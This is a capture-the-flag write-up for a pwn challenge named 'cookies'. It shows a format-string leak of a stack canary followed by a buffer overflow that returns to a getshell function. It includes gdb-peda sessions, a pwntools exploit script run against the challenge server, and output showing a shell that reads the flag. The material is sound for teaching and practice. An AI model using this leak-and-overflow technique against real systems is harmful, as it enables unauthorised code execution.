# cookies (pwn)

# Challenge description:

Cookies for my friends.

Flag format: CTF{sha256}

# Flag proof:

> CTF{1f94c05a1e6137bac004dc8aaf2d28ff35d7d6568d18495639cded566d9d4d26}
> 

# Summary:

The challenge involved a buffer overflow with a stack canary. In order to succeed, the canary must be leaked first, then written in its position on the stack so that its value is not changed

# Details:

We open the binary in IDA. It has 3 relevant functions:

- main

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  puts("Hello Hacker!");
  vuln();
  return 0;
}
```

- vuln

```c
unsigned __int64 vuln()
{
  int i; // [rsp+Ch] [rbp-74h]
  char buf[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  for ( i = 0; i <= 1; ++i )
  {
    read(0, buf, 0x200uLL);
    printf(buf);
  }
  return __readfsqword(0x28u) ^ v3;
}
```

- getshell

```c
int getshell()
{
  return system("/bin/bash");
}
```

Our goal is to call getshell by exploiting the buffer overflow inside vuln. The `buf` variable has 104 bytes, but the function reads 0x200 bytes. It also has a stack canary that we need to leak and send back. The read and printf are called twice, which is very convenient because the first iteration is for leaking the canary and the second iteration for the actual overflow

We open it in gdb-peda to inspect the binary. We set a breakpoint when the canary is read to know its value (easier to see in the stack afterwards), and another one just before `printf` to calculate its offset.

```c
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x000000000040078d <+0>:	push   rbp
   0x000000000040078e <+1>:	mov    rbp,rsp
   0x0000000000400791 <+4>:	add    rsp,0xffffffffffffff80
   0x0000000000400795 <+8>:	mov    rax,QWORD PTR fs:0x28
   0x000000000040079e <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x00000000004007a2 <+21>:	xor    eax,eax
   0x00000000004007a4 <+23>:	mov    DWORD PTR [rbp-0x74],0x0
   0x00000000004007ab <+30>:	jmp    0x4007d8 <vuln+75>
   0x00000000004007ad <+32>:	lea    rax,[rbp-0x70]
   0x00000000004007b1 <+36>:	mov    edx,0x200
   0x00000000004007b6 <+41>:	mov    rsi,rax
   0x00000000004007b9 <+44>:	mov    edi,0x0
   0x00000000004007be <+49>:	call   0x400640 <read@plt>
   0x00000000004007c3 <+54>:	lea    rax,[rbp-0x70]
   0x00000000004007c7 <+58>:	mov    rdi,rax
   0x00000000004007ca <+61>:	mov    eax,0x0
   0x00000000004007cf <+66>:	call   0x400630 <printf@plt>
   0x00000000004007d4 <+71>:	add    DWORD PTR [rbp-0x74],0x1
   0x00000000004007d8 <+75>:	cmp    DWORD PTR [rbp-0x74],0x1
   0x00000000004007dc <+79>:	jle    0x4007ad <vuln+32>
   0x00000000004007de <+81>:	nop
   0x00000000004007df <+82>:	mov    rax,QWORD PTR [rbp-0x8]
   0x00000000004007e3 <+86>:	xor    rax,QWORD PTR fs:0x28
   0x00000000004007ec <+95>:	je     0x4007f3 <vuln+102>
   0x00000000004007ee <+97>:	call   0x400600 <__stack_chk_fail@plt>
   0x00000000004007f3 <+102>:	leave  
   0x00000000004007f4 <+103>:	ret    
End of assembler dump.
gdb-peda$ break *vuln + 21
Breakpoint 1 at 0x4007a2
gdb-peda$ break *vuln + 66
Breakpoint 2 at 0x4007cf
```

First breakpoint:

```c
[----------------------------------registers-----------------------------------]
RAX: 0xb7aa9f033303ad00 
RBX: 0x0 
RCX: 0x7ffff7ea89b7 (<__GI___libc_write+23>:	cmp    rax,0xfffffffffffff000)
RDX: 0x1 
RSI: 0x1 
RDI: 0x7ffff7fac730 --> 0x0 
RBP: 0x7fffffffe3b0 --> 0x7fffffffe3c0 --> 0x1 
RSP: 0x7fffffffe330 --> 0x7ffff7faa760 --> 0xfbad2887 
RIP: 0x4007a2 (<vuln+21>:	xor    eax,eax)
R8 : 0xd ('\r')
R9 : 0x7ffff7fd9d00 (<_dl_fini>:	endbr64)
R10: 0x7ffff7fedab0 (<strcmp+4480>:	pxor   xmm0,xmm0)
R11: 0x246 
R12: 0x7fffffffe4e8 --> 0x7fffffffe732 ("/home/toma/unbreakable/cookie/cookie")
R13: 0x4007f5 (<main>:	push   rbp)
R14: 0x0 
R15: 0x7ffff7ffbc40 --> 0x50d1300000000
EFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400791 <vuln+4>:	add    rsp,0xffffffffffffff80
   0x400795 <vuln+8>:	mov    rax,QWORD PTR fs:0x28
   0x40079e <vuln+17>:	mov    QWORD PTR [rbp-0x8],rax
=> 0x4007a2 <vuln+21>:	xor    eax,eax
   0x4007a4 <vuln+23>:	mov    DWORD PTR [rbp-0x74],0x0
   0x4007ab <vuln+30>:	jmp    0x4007d8 <vuln+75>
   0x4007ad <vuln+32>:	lea    rax,[rbp-0x70]
   0x4007b1 <vuln+36>:	mov    edx,0x200
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe330 --> 0x7ffff7faa760 --> 0xfbad2887 
0008| 0x7fffffffe338 --> 0x4008ae ("Hello Hacker!")
0016| 0x7fffffffe340 --> 0x601060 --> 0x7ffff7faa760 --> 0xfbad2887 
0024| 0x7fffffffe348 --> 0x7ffff7fab560 --> 0x0 
0032| 0x7fffffffe350 --> 0x7ffff7ffbc40 --> 0x50d1300000000 
0040| 0x7fffffffe358 --> 0x7ffff7e21e63 (<_IO_new_file_overflow+275>:	cmp    eax,0xffffffff)
0048| 0x7fffffffe360 --> 0xd ('\r')
0056| 0x7fffffffe368 --> 0x7ffff7faa760 --> 0xfbad2887 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00000000004007a2 in vuln ()
gdb-peda$
```

The canary was read from the FS segment and placed in RAX and on the stack, and its value is `0xb7aa9f033303ad00`.

Second breakpoint:

```c
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7ea8912 (<__GI___libc_read+18>:	cmp    rax,0xfffffffffffff000)
RDX: 0x200 
RSI: 0x7fffffffe340 --> 0xa41414141 ('AAAA\n')
RDI: 0x7fffffffe340 --> 0xa41414141 ('AAAA\n')
RBP: 0x7fffffffe3b0 --> 0x7fffffffe3c0 --> 0x1 
RSP: 0x7fffffffe330 --> 0x7ffff7faa760 --> 0xfbad2887 
RIP: 0x4007cf (<vuln+66>:	call   0x400630 <printf@plt>)
R8 : 0xd ('\r')
R9 : 0x7ffff7fd9d00 (<_dl_fini>:	endbr64)
R10: 0x7ffff7fedab0 (<strcmp+4480>:	pxor   xmm0,xmm0)
R11: 0x246 
R12: 0x7fffffffe4e8 --> 0x7fffffffe732 ("/home/toma/unbreakable/cookie/cookie")
R13: 0x4007f5 (<main>:	push   rbp)
R14: 0x0 
R15: 0x7ffff7ffbc40 --> 0x50d1300000000
EFLAGS: 0x207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4007c3 <vuln+54>:	lea    rax,[rbp-0x70]
   0x4007c7 <vuln+58>:	mov    rdi,rax
   0x4007ca <vuln+61>:	mov    eax,0x0
=> 0x4007cf <vuln+66>:	call   0x400630 <printf@plt>
   0x4007d4 <vuln+71>:	add    DWORD PTR [rbp-0x74],0x1
   0x4007d8 <vuln+75>:	cmp    DWORD PTR [rbp-0x74],0x1
   0x4007dc <vuln+79>:	jle    0x4007ad <vuln+32>
   0x4007de <vuln+81>:	nop
Guessed arguments:
arg[0]: 0x7fffffffe340 --> 0xa41414141 ('AAAA\n')
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe330 --> 0x7ffff7faa760 --> 0xfbad2887 
0008| 0x7fffffffe338 --> 0x4008ae ("Hello Hacker!")
0016| 0x7fffffffe340 --> 0xa41414141 ('AAAA\n')
0024| 0x7fffffffe348 --> 0x7ffff7fab560 --> 0x0 
0032| 0x7fffffffe350 --> 0x7ffff7ffbc40 --> 0x50d1300000000 
0040| 0x7fffffffe358 --> 0x7ffff7e21e63 (<_IO_new_file_overflow+275>:	cmp    eax,0xffffffff)
0048| 0x7fffffffe360 --> 0xd ('\r')
0056| 0x7fffffffe368 --> 0x7ffff7faa760 --> 0xfbad2887 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 2, 0x00000000004007cf in vuln ()
gdb-peda$
```

The canary is not present in the 8 qwords gdb-peda shows, so let's dive deeper.

```c
gdb-peda$ context stack 20
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe330 --> 0x7ffff7faa760 --> 0xfbad2887 
0008| 0x7fffffffe338 --> 0x4008ae ("Hello Hacker!")
0016| 0x7fffffffe340 --> 0xa41414141 ('AAAA\n')
0024| 0x7fffffffe348 --> 0x7ffff7fab560 --> 0x0 
0032| 0x7fffffffe350 --> 0x7ffff7ffbc40 --> 0x50d1300000000 
0040| 0x7fffffffe358 --> 0x7ffff7e21e63 (<_IO_new_file_overflow+275>:	cmp    eax,0xffffffff)
0048| 0x7fffffffe360 --> 0xd ('\r')
0056| 0x7fffffffe368 --> 0x7ffff7faa760 --> 0xfbad2887 
0064| 0x7fffffffe370 --> 0x4008ae ("Hello Hacker!")
0072| 0x7fffffffe378 --> 0x7ffff7e1603a (<__GI__IO_puts+362>:	cmp    eax,0xffffffff)
0080| 0x7fffffffe380 --> 0x0 
0088| 0x7fffffffe388 --> 0x0 
0096| 0x7fffffffe390 --> 0x0 
0104| 0x7fffffffe398 --> 0x7fffffffe3c0 --> 0x1 
0112| 0x7fffffffe3a0 --> 0x7fffffffe4e8 --> 0x7fffffffe732 ("/home/toma/unbreakable/cookie/cookie")
0120| 0x7fffffffe3a8 --> 0xb7aa9f033303ad00 
0128| 0x7fffffffe3b0 --> 0x7fffffffe3c0 --> 0x1 
0136| 0x7fffffffe3b8 --> 0x400819 (<main+36>:	mov    eax,0x0)
0144| 0x7fffffffe3c0 --> 0x1 
0152| 0x7fffffffe3c8 --> 0x7ffff7dbefd0 (<__libc_start_call_main+128>:	mov    edi,eax)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$
```

We see the canary at offset 120, which is the 16th value. We are on 64-bit, so the first 6 arguments of a function are passed in registers. We can use the printf vulnerability to leak an argument of our choice. The first argument of printf is the format string, which leaves us with 5 more arguments in registers. The canary is at offset 16 on the stack, so it's the 21st argument. We just need to send `%21$p` to leak it

```c
➜  cookie ./cookie
Hello Hacker!
%21$p
0x87627c695baed100
^C
➜  cookie ./cookie
Hello Hacker!
%21$p
0xa3d19d17bbf0c900
^C
```

We got the canary, now let's overflow. We set a breakpoint before the canary is checked in order to see its offset

```c
gdb-peda$ break *vuln + 86
Breakpoint 1 at 0x4007e3
gdb-peda$ pattern create 200
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'
gdb-peda$ r
Starting program: /home/toma/unbreakable/cookie/cookie 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Hello Hacker!
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
AAA0X0P+0AsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA
[----------------------------------registers-----------------------------------]
RAX: 0x6941414d41413741 ('A7AAMAAi')
RBX: 0x0 
RCX: 0x0 
RDX: 0xffffffff 
RSI: 0x7fffffffc210 ("\nAA0X0P+0AsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAx"...)
RDI: 0x7fffffffc0f0 --> 0x7ffff7df6e40 (<__funlockfile>:	endbr64)
RBP: 0x7fffffffe3b0 ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
RSP: 0x7fffffffe330 --> 0x7ffff7faa760 --> 0xfbad2887 
RIP: 0x4007e3 (<vuln+86>:	xor    rax,QWORD PTR fs:0x28)
R8 : 0xcf 
R9 : 0x3 
R10: 0x7fffffffbb23 --> 0xe22df93030303030 
R11: 0x246 
R12: 0x7fffffffe4e8 --> 0x7fffffffe732 ("/home/toma/unbreakable/cookie/cookie")
R13: 0x4007f5 (<main>:	push   rbp)
R14: 0x0 
R15: 0x7ffff7ffbc40 --> 0x50d1300000000
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4007dc <vuln+79>:	jle    0x4007ad <vuln+32>
   0x4007de <vuln+81>:	nop
   0x4007df <vuln+82>:	mov    rax,QWORD PTR [rbp-0x8]
=> 0x4007e3 <vuln+86>:	xor    rax,QWORD PTR fs:0x28
   0x4007ec <vuln+95>:	je     0x4007f3 <vuln+102>
   0x4007ee <vuln+97>:	call   0x400600 <__stack_chk_fail@plt>
   0x4007f3 <vuln+102>:	leave  
   0x4007f4 <vuln+103>:	ret
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe330 --> 0x7ffff7faa760 --> 0xfbad2887 
0008| 0x7fffffffe338 --> 0x2004008ae 
0016| 0x7fffffffe340 ("\nAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
0024| 0x7fffffffe348 ("ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
0032| 0x7fffffffe350 ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
0040| 0x7fffffffe358 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
0048| 0x7fffffffe360 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
0056| 0x7fffffffe368 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x00000000004007e3 in vuln ()
gdb-peda$
```

We see RAX contains `A7AAMAAi`

```c
gdb-peda$ pattern offset A7AAMAAi
A7AAMAAi found at offset: 104
```

So we need 104 bytes of junk, then we place the canary. Let's see the offset where we can control the instruction pointer. For that, we can jump directly to the `leave` instruction to bypass the canary check

```c
gdb-peda$ set $pc = *vuln + 102
gdb-peda$ context
[----------------------------------registers-----------------------------------]
RAX: 0x6941414d41413741 ('A7AAMAAi')
RBX: 0x0 
RCX: 0x0 
RDX: 0xffffffff 
RSI: 0x7fffffffc210 ("\nAA0X0P+0AsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAx"...)
RDI: 0x7fffffffc0f0 --> 0x7ffff7df6e40 (<__funlockfile>:	endbr64)
RBP: 0x7fffffffe3b0 ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
RSP: 0x7fffffffe330 --> 0x7ffff7faa760 --> 0xfbad2887 
RIP: 0x4007f3 (<vuln+102>:	leave)
R8 : 0xcf 
R9 : 0x3 
R10: 0x7fffffffbb23 --> 0xe22df93030303030 
R11: 0x246 
R12: 0x7fffffffe4e8 --> 0x7fffffffe732 ("/home/toma/unbreakable/cookie/cookie")
R13: 0x4007f5 (<main>:	push   rbp)
R14: 0x0 
R15: 0x7ffff7ffbc40 --> 0x50d1300000000
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4007e3 <vuln+86>:	xor    rax,QWORD PTR fs:0x28
   0x4007ec <vuln+95>:	je     0x4007f3 <vuln+102>
   0x4007ee <vuln+97>:	call   0x400600 <__stack_chk_fail@plt>
=> 0x4007f3 <vuln+102>:	leave  
   0x4007f4 <vuln+103>:	ret    
   0x4007f5 <main>:	push   rbp
   0x4007f6 <main+1>:	mov    rbp,rsp
   0x4007f9 <main+4>:	mov    eax,0x0
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe330 --> 0x7ffff7faa760 --> 0xfbad2887 
0008| 0x7fffffffe338 --> 0x2004008ae 
0016| 0x7fffffffe340 ("\nAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
0024| 0x7fffffffe348 ("ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
0032| 0x7fffffffe350 ("AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
0040| 0x7fffffffe358 ("(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
0048| 0x7fffffffe360 ("A)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
0056| 0x7fffffffe368 ("AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
gdb-peda$
```

We step one instruction to destroy the stack frame

```c
gdb-peda$ si

[----------------------------------registers-----------------------------------]
RAX: 0x6941414d41413741 ('A7AAMAAi')
RBX: 0x0 
RCX: 0x0 
RDX: 0xffffffff 
RSI: 0x7fffffffc210 ("\nAA0X0P+0AsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAx"...)
RDI: 0x7fffffffc0f0 --> 0x7ffff7df6e40 (<__funlockfile>:	endbr64)
RBP: 0x41414e4141384141 ('AA8AANAA')
RSP: 0x7fffffffe3b8 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
RIP: 0x4007f4 (<vuln+103>:	ret)
R8 : 0xcf 
R9 : 0x3 
R10: 0x7fffffffbb23 --> 0xe22df93030303030 
R11: 0x246 
R12: 0x7fffffffe4e8 --> 0x7fffffffe732 ("/home/toma/unbreakable/cookie/cookie")
R13: 0x4007f5 (<main>:	push   rbp)
R14: 0x0 
R15: 0x7ffff7ffbc40 --> 0x50d1300000000
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4007ec <vuln+95>:	je     0x4007f3 <vuln+102>
   0x4007ee <vuln+97>:	call   0x400600 <__stack_chk_fail@plt>
   0x4007f3 <vuln+102>:	leave  
=> 0x4007f4 <vuln+103>:	ret    
   0x4007f5 <main>:	push   rbp
   0x4007f6 <main+1>:	mov    rbp,rsp
   0x4007f9 <main+4>:	mov    eax,0x0
   0x4007fe <main+9>:	call   0x40074a <init>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe3b8 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
0008| 0x7fffffffe3c0 ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
0016| 0x7fffffffe3c8 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
0024| 0x7fffffffe3d0 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
0032| 0x7fffffffe3d8 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
0040| 0x7fffffffe3e0 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
0048| 0x7fffffffe3e8 ("VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
0056| 0x7fffffffe3f0 ("AuAAXAAvAAYAAwAAZAAxAAyA\n\a@")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000004007f4 in vuln ()
gdb-peda$
```

The first value on the stack is the string `jAA9AAOA...`

```c
gdb-peda$ pattern offset jAA9AAOA
jAA9AAOA found at offset: 120
```

So, to recap:

- 104 bytes of junk
- 8 bytes of canary
- another 8 bytes of junk
- the return address

Let's write a script for this and run it on the server: 

```python
from pwn import *

context.log_level = 'debug'

# r = process("./cookie")
r = remote("34.159.190.67", 32340)
elf = ELF("./cookie")
r.clean()
r.sendline(b"%21$p")
canary = int(r.recvline().strip()[2:], 16)
log.success(f"{canary=}")
r.sendline(b"A" * 104 + p64(canary) + b"A" * 8 + p64(next(elf.search(asm("ret"), executable=True))) + p64(elf.sym['getshell']))
r.interactive()
```

Before jumping to `getshell`, we also jump to a `ret` instruction. Some versions of libc use `movaps` instructions, which require the stack to be aligned at 16 bytes. The Linux ABI guarantees this alignment in normal situations, but because we perform an exploit sometimes the stack is misaligned. This was the case of this challenge, so we jump to a `ret` instruction before in order to pop 8 bytes from the stack and align it

Output:

```c
[+] Opening connection to 34.159.190.67 on port 32340: Done
[*] '/home/toma/unbreakable/cookie/cookie'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[DEBUG] Received 0xe bytes:
    b'Hello Hacker!\n'
[DEBUG] Sent 0x6 bytes:
    b'%21$p\n'
[DEBUG] Received 0x13 bytes:
    b'0xa977a594dfce2400\n'
[+] canary=12211410973466960896
[DEBUG] cpp -C -nostdinc -undef -P -I/home/toma/.local/lib/python3.9/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    .p2align 2
    _start:
    __start:
    .intel_syntax noprefix
    ret
[DEBUG] /usr/bin/x86_64-linux-gnu-as -32 -o /tmp/pwn-asm-rsevhfli/step2 /tmp/pwn-asm-rsevhfli/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-rsevhfli/step3 /tmp/pwn-asm-rsevhfli/step4
[DEBUG] Sent 0x89 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000060  41 41 41 41  41 41 41 41  00 24 ce df  94 a5 77 a9  │AAAA│AAAA│·$··│··w·│
    00000070  41 41 41 41  41 41 41 41  d6 05 40 00  00 00 00 00  │AAAA│AAAA│··@·│····│
    00000080  37 07 40 00  00 00 00 00  0a                        │7·@·│····│·│
    00000089
[*] Switching to interactive mode
[DEBUG] Received 0x68 bytes:
    65 * 0x68
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x33 bytes:
    b'flag.txt\n'
    b'stack-cookie-bypass\n'
    b'stack-cookie-bypass.c\n'
flag.txt
stack-cookie-bypass
stack-cookie-bypass.c
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x45 bytes:
    b'CTF{1f94c05a1e6137bac004dc8aaf2d28ff35d7d6568d18495639cded566d9d4d26}'
CTF{1f94c05a1e6137bac004dc8aaf2d28ff35d7d6568d18495639cded566d9d4d26}$ 
[*] Interrupted
[*] Closed connection to 34.159.190.67 port 32340
[*] Stopped process './cookie' (pid 1854)
```